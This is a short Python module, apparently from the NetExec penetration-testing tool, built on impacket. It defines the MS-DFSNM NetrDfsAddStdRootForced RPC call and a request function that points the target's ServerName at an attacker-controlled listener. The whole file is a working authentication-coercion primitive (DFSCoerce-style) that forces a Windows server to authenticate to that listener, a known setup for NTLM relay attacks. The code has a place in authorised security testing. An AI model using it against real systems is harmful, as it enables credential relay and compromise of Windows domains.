from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import WSTR

from nxc.modules.coerce_plus_method.DCERPCSessionError import DCERPCSessionError

class NetrDfsAddStdRootForced(NDRCALL):
    """
    NET_API_STATUS NetrDfsAddStdRootForced(
        [in, string] WCHAR* ServerName,
        [in, string] WCHAR* RootShare,
        [in, string] WCHAR* Comment,
        [in, string] WCHAR* Share
    );
    """
    opnum = 15
    structure = (
        ("ServerName", WSTR),  # Type: WCHAR *
        ("RootShare", WSTR),  # Type: WCHAR *
        ("Comment", WSTR),  # Type: WCHAR *
        ("Share", WSTR),  # Type: WCHAR *
    )


class NetrDfsAddStdRootForcedResponse(NDRCALL):
    structure = ()


def request(dce, target, listener):
    request = NetrDfsAddStdRootForced()
    request["ServerName"] = f"{listener}\x00"
    request["RootShare"] = "test\x00"
    request["Comment"] = "lodos\x00"
    request["Share"] = "x:\\lodos2005\x00"
    dce.request(request)